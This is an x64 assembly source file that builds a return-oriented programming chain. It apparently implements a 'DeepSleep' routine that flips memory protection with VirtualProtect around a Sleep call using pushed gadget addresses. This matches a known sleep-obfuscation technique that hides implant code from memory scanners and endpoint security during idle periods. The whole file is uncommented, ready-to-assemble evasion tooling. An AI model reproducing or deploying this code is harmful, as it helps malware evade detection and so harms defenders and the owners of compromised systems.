.code

GetRIP PROC
	jmp FakeStub
	ret
GetRIP ENDP

FakeStub PROC
	pop rax
	jmp rax
FakeStub ENDP

RopThis PROC

	push 2
	push 1
	push 1
	push 1
	push 1
	push QWORD PTR [rbp + 48h] ; addRsp32Popr14
		
	push QWORD PTR [rbp + 30h] ; VirtualProtect
	push 1
	push 1
	push r9
	push 20h ; PAGE_EXECUTE_READ
	push rcx
	push rdx
	push QWORD PTR [rbp + 40h] ; SuperPop

	push 2
	push 1
	push 1
	push 1
	push 1
	push QWORD PTR [rbp + 48h] ; addRsp32Popr14

	; Sleep
	push QWORD PTR [rbp + 38h] ; Sleep
	push 41h
	push 41h
	push 41h
	push 41h
	push QWORD PTR [rbp + 50h] ; Sleeptime here
	push 41h
	push QWORD PTR [rbp + 40h] ; SuperPop
	
	push 2
	push 1
	push 1
	push 1
	push 1
	push QWORD PTR [rbp + 48h] ; addRsp32Popr14

	push QWORD PTR [rbp + 30h] ; VirtualProtect
	push 1
	push 1
	push r9
	push r8
	push rcx
	push rdx
	push QWORD PTR [rbp + 40h] ; SuperPop

	ret

RopThis ENDP

DeepSleep PROC

	push rbp
	mov rbp, rsp

	push rbx
	push rsi
	push rdi
	push r12
	push r13
	push r14
	push r15

	call RopThis

	pop r15
	pop r14
	pop r13
	pop r12
	pop rdi
	pop rsi
	pop rbx

	mov rsp, rbp
	pop rbp
	ret

DeepSleep ENDP


end